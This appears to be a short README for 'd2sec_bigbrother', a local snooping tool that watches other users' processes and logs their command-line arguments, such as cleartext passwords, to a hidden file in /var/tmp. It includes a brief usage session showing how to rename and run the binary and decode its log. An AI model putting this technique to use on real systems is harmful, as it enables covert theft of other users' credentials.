Local exploit
--------------

d2sec_bigbrother might allow local users to list the processes and to
survey arguments on command line. For example, it can be used against
binaries showing passwords in the clear on the command line.

It's not an evolved backdoor :
- not hidden process
- a weak encryption algorithm
- not hidden key
- etc

It logs information in a file named /var/tmp/.zmanXXXX. To set binary to
survey, you must set D2SEC environment variable, rename d2sec_bigbrother
binary as you like and run it. The created process is attached to init
process.

For example:

$ export D2SEC="foo" 
$ cp d2sec_bigbrother blaat 
$ ./blaat
$ ps -ef | grep blaat
compaq   14424     1 99 17:43 pts/6    00:00:05 ./blaat
$ /tmp/foo bar
$ ps -ef | grep blaat
$ ls -alp /var/tmp/.zman*
-rw------- 1 compaq compaq 77 mar 30 17:43 /var/tmp/.zmanj45Ii9
$ ./d2sec_bigbrother -d /var/tmp/.zmanj45Ii9
